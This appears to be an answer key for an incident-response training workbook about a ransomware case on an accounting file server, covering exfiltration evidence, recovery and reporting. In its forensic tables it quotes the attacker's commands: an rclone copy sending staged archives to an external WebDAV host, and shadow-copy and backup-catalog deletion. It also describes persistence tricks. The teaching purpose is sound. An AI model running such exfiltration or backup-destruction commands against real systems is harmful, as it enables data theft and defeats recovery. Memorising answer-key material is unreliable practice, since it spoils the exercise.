| `C:\Shares\Finance` | 57 | 1,218,833,431 |
| `C:\Shares\HR` | 18 | 85,382,181 |
| `C:\Shares\Legal` | 20 | 97,394,886 |
| `C:\Shares\IT\Backups\SQL` | 5 | 72,245,603,301 |
| **Total in scope for the archive** | **411 of 418** | 78,636,735,651 |

The seven files not in the archive scope are in `C:\Users\svc-backup\Documents` — encrypted but, on this evidence, not staged.

**Part C — the transfer tool:**

| Artifact | What it shows |
|---|---|
| Prefetch | `RCLONE.EXE`, **RunCount 3**, LastRun 2024-11-11 22:41:06, previous runs 21:03:02 and 20:59:14 — three sessions, of which the last is the transfer |
| Amcache | `C:\Windows\Temp\wu\rclone.exe`, 62,894,080 bytes, version 1.65.0.0, publisher `https://rclone.org`, with SHA-1 and SHA-256 |
| ShimCache | Same path, `Executed=NA` — presence only |
| MFT | Same path, `InUse=False`, created 2024-11-11 20:58:41, deleted 03:41:22 |
| Recovered config | `rclone-conf-recovered.txt` — remote `vault-remote`, type `webdav`, url `https://185.220.101.44:443/dav` |
| Command line | PowerShell 4104 at 22:41:06 — `copy 'C:\Windows\Temp\wu' vault-remote:acct --transfers 8 --multi-thread-streams 4 --ignore-existing -q`, **no `--log-file`** |
| Persistence reference | System 7045 `VaultUpd` and the `HKLM\…\Run\WindowsUpdateSvc` value both point at this binary |

**Q1: What does archive-volume naming cost you?**

It costs you the record-level answer. Counsel's question is "whose data was in the exfiltrated set?", and the staged file names are `acct-fs01-data.7z.001` through `.012`: 12 opaque containers. You cannot enumerate the affected records, name the data subjects, or say which specific contracts, payroll files or HR documents left.

The 7-Zip command line partially compensates, because it names five source trees. That gets you from "we know 34 GiB left" to "we know 34 GiB of the accounting, finance, HR, legal and SQL-backup trees left, comprising 411 of the 418 files subsequently encrypted." That is enough for counsel to scope notification by *category* and by *share*, and enough for the business to identify which data owners to consult. It is materially better than nothing and materially worse than a file list. Say both halves in the report.

**Q2: What would `--log-file` have changed?**

It would move the finding from *highly likely* to *confirmed*. The chapter's tier definitions are explicit: "Confirmed" requires direct evidence of transfer with named data and volume — an rclone log listing transferred files, corroborated by matching egress volume. You already have the matching egress volume, three times over. The only missing element is the per-file record, and `--log-file` is exactly that record. That missing record is the single artifact standing between this case and a conclusive exfiltration finding, which is why naming it explicitly in the report matters. It tells the reader precisely what was missing, rather than leaving them to guess how much doubt "highly likely" encodes.

**Q3: Why is `rclone.conf` the highest-value single artifact?**

Because it names the destination and the protocol in one file, and neither is recoverable from anywhere else on the host with the same certainty. Flow tells you bytes went to an IP. The config tells you the actor deliberately configured a remote called `vault-remote` pointing at a WebDAV endpoint at that address. That converts an IP in a flow record into the actor's infrastructure. The config also gives you an obfuscated credential that can be reversed with `rclone reveal`, which occasionally yields a reusable indicator. And it is the artifact that survives a rename of the binary: an actor calling rclone `svchost.exe` still needs a config, and the config still says `webdav`.

---

## Task 11 — Bound the Egress and Write the Exfiltration Finding

**Parts A and B — see `walkthrough-answers.md` Step 8 for the full tables.** The headline comparison:

| Measure | Value | Ratio to staged |
|---|---|---|
| Staged on disk | 36,829,344,563 | 1.0000 |
| Flow bytes out to `185.220.101.44` | 37,312,004,096 | **1.0131** |
| SRUM `rclone.exe` bytes sent | 36,884,201,472 | 1.0015 |

**Part C — the confounder:** six nightly Veeam backup jobs to `10.0.6.41`, each 214,748,364,800 bytes — roughly **5.8× the entire exfiltration**. Volume alone is not the signal. What identifies the exfiltration is an unfamiliar destination with no prior contact, an owning process with no business making outbound connections, a window outside any scheduled job, and a byte count that matches a staged set on disk.

**Part D — the tiered finding:** see `walkthrough-answers.md` Step 9 for the full text. Summary of the tier assessment:

| Tier | Applies? | Why |
|---|---|---|
| Confirmed | **No** | Requires a per-file transfer record. The rclone invocation omitted `--log-file`; no proxy logs retained |
| **Highly likely** | **Yes** | Staging evidence + transfer-tool execution + egress volume consistent with the staged set, without a per-file record — the chapter's definition, met exactly |
| Possible / cannot be excluded | No | Understates it. Three independent volume measurements agree within 1.5 % |
| No evidence found | No | Plainly contradicted |
| Cannot be determined | No | The relevant sources were available and reviewed. This is the distinction that matters most |

**Q1: What would move it to "Confirmed"?**

An rclone log file listing transferred filenames, or proxy logs for the 22:41–00:52 window carrying per-request byte counts and the `rclone/v1.65.0` user agent, or destination-side evidence. Any one of the three supplies the missing per-file record. None of them are host-side, so more analysis of this collection cannot close the gap. That is worth saying, so nobody spends another day looking.

**Q2: Explain the difference to a non-technical executive.**

"'We found no evidence of exfiltration' means we had the logs we needed, we looked at them, and there was nothing there. 'We could not determine whether exfiltration occurred' means the logs that would have answered the question weren't kept, so we genuinely don't know — the absence of a finding tells you nothing. Those two sentences lead to opposite notification decisions, so we are careful never to write one when we mean the other. In your case, neither applies: we found substantial evidence of exfiltration and we are calling it highly likely."

**Q3: The leak site publishes a matching directory listing?**

It changes the *lead*, not the finding. A published file tree matching your share structure is worth verifying against your own evidence immediately. Compare it against the 7-Zip source trees and the encrypted-file inventory, and check whether the listed paths correspond to directories the archive command actually covered. If they match, you have corroboration from a second source and the finding can strengthen.

The listing does not prove anything by itself. Crews publish samples from unrelated victims, and they publish file trees they harvested from a directory listing without ever transferring the contents. The actor's claim is not evidence, before or after publication. If the leak site publishes actual file *contents* that hash-match documents from your shares, that is different. That is direct evidence, and it would move the finding to Confirmed.

---

## Task 12 — Deliver the Four Recovery Assessments

The full assessment table, with confidence levels and escalation paths, is in `walkthrough-answers.md` Step 9. Summary:

| Assessment | Finding | Confidence |
|---|---|---|
| Scope confidence | Host fully scoped; environment not scoped | HIGH (host) / **LOW (environment)** |
| Actor presence | No post-encryption activity observed, but re-entry needs no re-exploitation | MEDIUM |
| Backup trustworthiness | Persistence provably present in any restore point taken after 2024-11-10 23:41:08, including the 2024-11-11 nightly backup | HIGH for that finding; **cannot be determined** overall from this host |
| Reinfection risk | **HIGH** | HIGH |

**Part A — persistence inventory (six entries):** `PSEXESVC` (removed by the actor), the `VaultUpd` service, the `WindowsUpdateSvc` Run value, the two Defender policy values, the Defender exclusions for the staging path and `rclone.exe`, and `fDenyTSConnections = 0`. Five remain on the host. How many come back with a restore depends on when the restore point was taken. A backup taken after 2024-11-10 23:41:08 carries three: `VaultUpd`, the Run value, and `fDenyTSConnections = 0`. The Defender exclusions reach only backups taken after 2024-11-11 21:53:04, and the policy values only those after 2024-11-12 02:02:24. The newest nightly job in `network-flow.csv` ran 2024-11-11 01:12–02:00 UTC, so a restore from it brings back three of the five. The two Defender entries postdate every backup job in the flow record.

**Part B — backup viability:**

| Question | Answer | Basis |
|---|---|---|
| Do they exist? | Shadow copies: **no** — `vssadmin list shadows` returns nothing, volsnap 25 ×4 at 02:06. Platform backups: **unknown from this host** — a `wbadmin delete catalog -quiet` was executed at 02:10:58 and the platform must be queried directly | `vssadmin-list-shadows.txt`, `system-evtx.csv`, `security-evtx.csv` |
| Are they clean? | Any restore point after 2024-11-06 21:03 is inside the dwell window. The 2024-11-11 nightly backup (01:12–02:00) demonstrably contains `VaultUpd`, the Run value and the RDP re-enablement. The 2024-11-10 job predates the first two but already carries the RDP re-enablement. The first *candidate* clean point predates 2024-11-06 | `system-evtx.csv` 7045, `registry-runkeys.csv` LastWrite times, `network-flow.csv` backup-job times |
| Are they complete? | A pre-2024-11-06 restore point loses at least six days of accounting activity. Whether that is acceptable is the business's call, and they can only make it if the dwell-window start date is stated clearly | Dwell window from Task 9 |

**Part C — remediation prerequisites (sample, eight items):**

1. TCP/3389 is confirmed closed to the internet on JUMP-01 and on every other perimeter host, verified from outside the network.
2. `FINANCE\svc-backup` and `FINANCE\a-mbrennan` passwords are rotated, and every service consuming `svc-backup` has been re-registered with the new credential.
3. A domain-wide credential exposure assessment has been completed, including a documented decision on whether `krbtgt` requires a double rotation.
4. The five remaining persistence items are removed from ACCT-FS01, and all six are hunted for on every other in-scope host, with the hunt results recorded.
5. An enterprise-wide sweep for the `.vaulted` extension and `RECOVER-YOUR-FILES.txt` has been completed and the affected-host list is closed.
6. The chosen restore point predates 2024-11-06 21:03 UTC, or has been mounted and individually verified free of the six persistence indicators.
7. EDR is deployed and reporting on every host being restored, before it is returned to the network.
8. Detection is in place for the identified indicators — `185.220.101.44`, `rclone.exe` execution, `vssadmin delete shadows`, EID 1102, and 7045 events with mismatched display names.

**Q1: Highest and lowest confidence?**

Highest: **reinfection risk**. It is high for reasons that are directly evidenced rather than inferred. The initial access path is open, neither compromised account is rotated, and five persistence items remain on the host. Three of them, each with a recorded install or LastWrite time, come back with a restore from the newest nightly backup. Every element of that assessment points at a specific artifact.

Lowest: **backup trustworthiness**, because the decisive evidence is not in this collection at all. You can prove that the 2024-11-11 restore point carries the actor's persistence. You cannot say from this host whether any restore point exists, whether the catalog deletion succeeded, or whether the backup appliance itself was touched. The actor reached `BKP-SRV01` on 2024-11-09 with a domain admin credential, which is precisely the reason to worry. That answer has to be "cannot be determined from the evidence available", with a named next step.

**Q2: A 2024-11-10 restore point is offered because it loses the least data?**

Reject it, and give the evidence. The flow record places the 2024-11-10 backup in the nightly Veeam window, 01:12–02:00 UTC. That is three days into the dwell window and a day after the actor reached ACCT-FS01. The image carries `fDenyTSConnections = 0`, whose key LastWrite (2024-11-09 01:21:07) falls inside the actor's PsExec session. It predates the `VaultUpd` service (2024-11-10 23:41:08) and the `WindowsUpdateSvc` Run value (23:39:52), so a hunt of it would not find them, and that negative result would not make it clean. The 2024-11-11 job carries both, and both point at `C:\Windows\Temp\wu\rclone.exe` and auto-start. Restoring either image puts the actor's access back on the server, on a host whose credentials are still valid and whose entry path is still open. The correct framing for the business is not "no" but "this restore point costs you less data and reintroduces the intrusion; the first candidate clean point predates 2024-11-06 21:03, and here is what it costs you instead." Then let them choose with the tradeoff visible.

**Q3: Why is "we checked" worth more than "we believe"?**

Because "we believe the backup is clean" is an inference from the backup's date, and the date is exactly the thing the dwell window has already made unreliable. Mounting the image and hunting it for the six specific persistence indicators you found in production converts an assumption into an observation. It is a cheap step, and teams skip it constantly. It also produces a defensible artifact: a documented negative result against a named indicator list. That is what you will want if the environment is reinfected anyway and someone asks what was checked. "We believe" is a statement about your confidence. "We checked" is a statement about the evidence, and only one of them survives review.

---

## Task 13 — Write the Incident Summary and Handoff

**Part A — the scoping deliverable:**

| Field | ACCT-FS01 |
|---|---|
| Encryption start (UTC) | 2024-11-12 02:14:06 |
| Encryption stop (UTC) | 2024-11-12 03:38:41 |
| Duration | 84 minutes 35 seconds |
| Encrypted file count | 418 |
| Encrypted data volume | 78,662,133,156 bytes (73.26 GiB) |
| Affected directories | 24 |
| Directories excluded | `C:\Windows\`, `C:\Program Files\`, `C:\ProgramData\`, `C:\Windows\Temp\wu\` (the actor's own staging directory), and `C:\Shares\Finance\Reports\Archive` (files locked by a running service) |
| Encryption performed locally? | Yes — Security 4688 at 02:13:52, `VAULT.EXE` Prefetch, Amcache and ShimCache; 1 × 5140 and 0 × 5145 |
| Shadow copies available? | No — `vssadmin list shadows` empty; four volsnap EID 25 records at 02:06:34–02:06:41 |
| **All figures are host-level and preliminary** | An enterprise sweep has not been completed |

**Part B — sample incident summary:**

> **Case reference:** IR-2024-ACCTFS01 — Vault ransomware, ACCT-FS01
> **Author:** J. Responder, IR team
> **Date/Time (UTC):** 2024-11-13 09:00 — interim report 1
>
> **Scope of investigation.** ACCT-FS01, a Windows Server 2019 accounting file server (`10.0.6.15`, domain FINANCE), was encrypted on 2024-11-12. IR was engaged at 07:15 that day. A disk image was acquired at 08:40 following a preservation hold. **No memory image was captured before engagement**, and this report records that as a limitation. Analysis covered NTFS (MFT and USN Journal), the Security, System, Defender Operational, TerminalServices Operational and PowerShell Operational channels on this host, the Security logs of `FINANCE-DC01` and `JUMP-01`, execution artifacts (Prefetch, Amcache, ShimCache), registry persistence, network flow, and SRUM. This report covers one host. The environment has not been swept.
>
> **Dwell window.** Earliest observed attacker activity is 2024-11-06 21:03:12 UTC — the first of 212 failed logons against `FINANCE\svc-backup` on the internet-exposed jump host JUMP-01, from `45.147.230.19`. Encryption completed 2024-11-12 03:38:41 UTC. Dwell time is six days. JUMP-01 Security log retention begins 2024-11-04; **activity before that date cannot be excluded**.
>
> **What happened.** The brute force succeeded at 2024-11-06 21:47:22 (Security 4624, LogonType 10). The domain controller independently corroborates it with 212 EID 4776 validation failures and one success. Discovery followed on 2024-11-07 and credential theft on 2024-11-08. A domain administrator account (`a-mbrennan`) began appearing from the jump host 12 minutes after the LSASS dump. The actor reached ACCT-FS01 on 2024-11-09 through a PsExec-style service install, followed by four RDP sessions. During the first session, Defender on ACCT-FS01 quarantined credential-dumping and network-scanning tooling. On 2024-11-10 the actor installed persistence: a `VaultUpd` service and a `Run` value, both pointing at `C:\Windows\Temp\wu\rclone.exe`. On 2024-11-11 between 21:14 and 22:38 UTC, the actor archived 36,829,344,563 bytes of accounting, finance, HR, legal and SQL-backup data into a 12-volume 7-Zip archive in `C:\Windows\Temp\wu\`. Between 22:41 and 00:52 the following morning, approximately the same volume was transferred to `185.220.101.44`. Between 02:02:18 and 02:09:41 on 2024-11-12 the actor disabled Defender, deleted four volume shadow copies, and cleared the Security log. Encryption ran locally from 02:14:06 to 03:38:41, renaming 418 files across 24 directories to `.vaulted` and dropping a ransom note in each directory. The actor deleted the encryptor and the staging directory afterwards.
>
> **Scope.** 418 files, 78,662,133,156 bytes (73.26 GiB), 24 directories. Five SQL backup files account for 91.8 % of the data volume. The remaining 413 files are accounting, payroll, tax, vendor, HR and legal documents. These are host-level figures only. An enterprise sweep is outstanding, and the environment-wide total can only increase.
>
> **Exfiltration.** **Highly likely** under the confidence definitions in use. Three independent measurements agree within 1.5 %, consistent with a completed transfer: 34.30 GiB staged on disk, 34.35 GiB attributed to `rclone.exe` by SRUM, and 34.75 GiB observed in flow to `185.220.101.44`. Not "confirmed": the transfer tool was invoked without a log file, so no per-file record exists, and no proxy logs were retained for the window. The staged set is known by source directory (`C:\Shares\Accounting`, `\Finance`, `\HR`, `\Legal`, `\IT\Backups\SQL`) but not by filename. The relevant sources were available and reviewed. This is a "highly likely" finding, not a "cannot be determined" one.
>
> **Recovery assessments.** Scope confidence: HIGH for this host, LOW for the environment. Actor presence: MEDIUM. No compromised-account authentication was observed after 04:12:44 on 2024-11-12, but five persistence items remain in place and the entry path is open, so re-entry would not require re-exploitation. Backup trustworthiness: shadow copies destroyed and catalog deletion attempted. Any restore point after 2024-11-06 21:03 sits inside the dwell window, and the 2024-11-11 nightly backup demonstrably contains the actor's persistence. Overall backup viability cannot be determined from this host and requires the backup platform. Reinfection risk: HIGH.
>
> **Gaps.** No memory image (irrecoverable). No proxy logs for the exfiltration window. No pre-clear Security log and no shadow copy from which to recover one. No backup-platform data. No enterprise sweep. Each of these bounds a specific conclusion above and is named where it applies.
>
> **Recommended next steps.** (1) Enterprise EDR sweep for `.vaulted` and `RECOVER-YOUR-FILES.txt`. (2) Confirm TCP/3389 is closed at the perimeter. (3) Rotate `svc-backup` and `a-mbrennan`; assess `krbtgt`. (4) Retrieve backup-platform logs and identify the newest restore point predating 2024-11-06 21:03. (5) Mount the candidate restore point and hunt it for the six documented persistence indicators. (6) Submit the family indicators for decryptor identification. (7) Preserve JUMP-01 before it is rebuilt.

**Part D — "Do you think we should pay?":**

> That decision sits with leadership and counsel, not with me. It turns on legal exposure, sanctions screening, insurance terms and business tolerance for publication, and I have visibility into exactly one of those. What I can tell you is what the evidence supports on the inputs you will weigh. Recovery without a decryptor depends on a backup predating 2024-11-06, which we have not yet verified exists. Data exfiltration is highly likely rather than confirmed, so paying to suppress publication is not paying to suppress a hypothetical. We are checking whether a free decryptor exists for this family. And the actor's persistence is still in place, which means paying today without remediating first invites a second event. I will have the backup answer within 24 hours, and I would not want a payment decision made before it.

**Q1: Which sentence is most likely to be quoted out of context?**

The exfiltration finding. At least one recipient will read "highly likely" as "confirmed", and at least one other will read "not confirmed" as "no evidence". Defensive phrasing: state the tier, immediately state the basis in specifics, immediately state why it is not the tier above, and immediately distinguish it from "cannot be determined." Put all four in the same paragraph, so a quotation that clips one clause still carries the qualification. The second candidate is the scope figure. That is why "host-level and preliminary" appears in the same table row as the number, not in a footnote.

**Q2: Why does advocating on payment cost you neutrality?**

Because once you have taken a position, every finding you report is read as supporting it. A scope number becomes an argument for or against paying. An exfiltration tier becomes advocacy. A backup assessment becomes a lever. The decision-makers stop reading your report as evidence and start reading it as a case being made. At that point you lose your actual value, which is being the one person in the room whose statements are grounded in artifacts. Neutrality here is not squeamishness or evasion. It is what keeps the rest of the findings usable. It is also entirely compatible with being helpful: "here is what the evidence supports on each input you will weigh" answers the real question without answering the one you were asked.

**Q3: What belongs in recommendations rather than findings?**

The preservation failure: nobody captured memory before IR was engaged, and that possibility is permanently gone. The logging posture: process-creation auditing was enabled and paid off. But the absence of proxy logs for the exfiltration window is what holds the finding at "highly likely", and centralised log forwarding would have made the Security log clear irrelevant. The exposure itself: an internet-exposed RDP jump host with a non-expiring service account password is a password-policy and architecture finding as much as an attack finding. The brute force succeeded in 44 minutes. And EDR coverage, which is off-host and out of the actor's reach, and which would have answered the environment-scope question in minutes rather than leaving it open. None of these are findings about what the actor did. All of them are findings about what made it work, which is what the business can actually change.

---

## Ready-to-move-on self-check

**1. Why is the Security 4688 for the encryptor available at all, when the log was cleared?**

Because the actor cleared the log at 02:09:41 and ran the encryptor at 02:13:52 — four minutes and eleven seconds *after*. The first encrypted file followed at 02:14:06, 4 min 25 s after the clear. The clearing emptied the log. It did not disable auditing. Everything the actor did afterwards was written into the fresh, empty log, including the encryptor's full command line. The general point to internalise: log clearing is a moment, not a state. Evidence after the clear is intact, evidence before it is gone, and the boundary is a timestamp you can read off the 1102 itself.

**2. Why is the exfiltration finding "highly likely" rather than "confirmed", given three measurements agreeing within 1.5 %?**

Because the tier definitions turn on the *kind* of evidence, not its weight. "Confirmed" requires direct evidence of transfer with named data — a per-file record. Three volume measurements are strong corroboration that a transfer of that size happened and completed, but none of them names a single file. The rclone invocation omitted `--log-file` and no proxy logs were retained, so no per-file record exists anywhere in the available evidence. Stopping at "highly likely" and naming the exact missing artifact is what makes the finding survive review. Upgrading it because the volume agreement feels conclusive is how responders lose arguments they should win.

**3. Why can you not say the encrypted-file count is 418 without qualification?**

Because 418 is the count on one host, and the environment has not been swept. The actor held a domain admin credential from 2024-11-08 and reached the backup infrastructure on 2024-11-09. There may be other encrypted hosts. Any encrypted network share is encrypted by whichever host mounted it, so a fully encrypted share elsewhere could have no local execution evidence at all. Scoping numbers get quoted in board updates within the hour, and a number revised upward later costs credibility exactly when the recovery assessments need it. "418 on ACCT-FS01; enterprise sweep outstanding" is the honest form.

**4. What is the single most consequential sentence in the dwell-window statement?**

"JUMP-01 Security log retention begins 2024-11-04; activity before that date cannot be excluded." Without it, a six-day dwell window reads as a fact rather than as a floor, and the client picks a restore point on that basis. The field composite in Chapter 12 §12.4.5 describes a team that omitted this sentence, reported a two-day window that was really the age of their oldest log, and watched the environment get reinfected in 48 hours.

---

## Walkthrough ↔ workbook bridges

These bridges connect the workbook tasks in this file to specific values that the Hands-On Walkthrough produces when it resolves the case against `Data/ACCT-FS01/`.

- **Task 4 (extension sweep) ↔ Walkthrough Step 2.** The walkthrough produces 418 files, 78,662,133,156 bytes and 24 directories, and then ranks the directories twice, by count and by volume. The two rankings come out in nearly opposite orders. You can answer Task 4's first question ("which ranking does the recovery team need, and which does counsel need?") only once both rankings are in front of you. The 5-files-is-91.8 %-of-volume result is the concrete form of Chapter 12 §12.3.1's warning.

- **Task 5 (encryption window) ↔ Walkthrough Step 4.** The walkthrough produces 2,162 records across 85 minute bins, a peak of 30, a baseline of 0.13 per minute, and a trough at 03:30–03:36. Task 5 Part C asks you to explain the trough. The walkthrough gives you the bin counts, and Step 3 gives you the reason: the SQL directory's 7-minute 8-second note gap. The two artifacts cross-check each other, which is the point, because a single-source window is a hypothesis.

- **Task 6 (blast radius map) ↔ Walkthrough Step 3.** The 24 ransom-note `$SI` Born timestamps produce the traversal order directly, and the largest gap identifies the SQL directory. The last row of the walkthrough's table answers Task 6's fourth question, about what the encryption of `C:\Users\svc-backup\Documents` says about the account. That row corroborates the account attribution that Step 5 establishes from the 4688.

- **Task 7 (local vs. remote) ↔ Walkthrough Step 5.** The walkthrough produces one 4688, one Prefetch entry with RunCount 1, matching Amcache and ShimCache rows, one 5140 and zero 5145 records. Task 7 asks you to lay the local and remote predictions side by side *before* looking. Doing it in that order turns the result from a confirmation of what you assumed into a test you could have failed.

- **Task 8 (defense evasion) ↔ Walkthrough Step 6.** The walkthrough rebuilds 16 steps, 13 of which have no surviving 4688, from Defender Operational, System `volsnap`, PowerShell 4104, Prefetch and the registry. Task 8's fourth question — three sources a log-clearing actor forgets — maps directly onto those channels. The 11 min 48 s and 4 min 25 s intervals come from the same table.

- **Task 9 (patient zero) ↔ Walkthrough Step 7.** 212 failures on the jump host, 212 validation failures on the domain controller, one success at 21:47:22, `a-mbrennan` first appearing at 2024-11-08 02:04:18, and eight TerminalServices 1149 records. The walkthrough writes out the same dwell-window statement as Task 9 Part E, in slightly different words. The point of writing it out is that you should be able to produce it from memory on the next case.

- **Task 10 (staging) ↔ Walkthrough Step 8.** 868 USN records in the staging directory, 16 deletions, 12 archive volumes totalling 36,829,344,563 bytes, and an 847-record staging burst detected by the same binning technique used on the encryption. Task 10 Part B's source-directory table comes from the PowerShell 4104 record the walkthrough surfaces. That record converts 12 opaque archive volumes into five named share trees.

- **Task 11 (exfiltration finding) ↔ Walkthrough Steps 8 and 9.** The three volume measurements agreeing within 1.5 % are Step 8; the tiered finding written out in full is Step 9. Task 11 Part C's confounder, six nightly backup jobs each 5.8× larger than the exfiltration, guards against the most common shortcut in egress hunting: sorting on bytes and stopping at the top row.

- **Task 12 (recovery assessments) ↔ Walkthrough Step 9.** The walkthrough produces the four assessments, their confidence levels, and the "what would raise it" column in full. The persistence inventory that drives the backup-trustworthiness assessment comes from the two 7045 records, the four malicious registry values and `fDenyTSConnections` in the same step. The distinction the walkthrough preserves — HIGH confidence for the host, LOW for the environment, "cannot be determined" for backup viability — is exactly the distinction Task 12 asks you not to flatten.
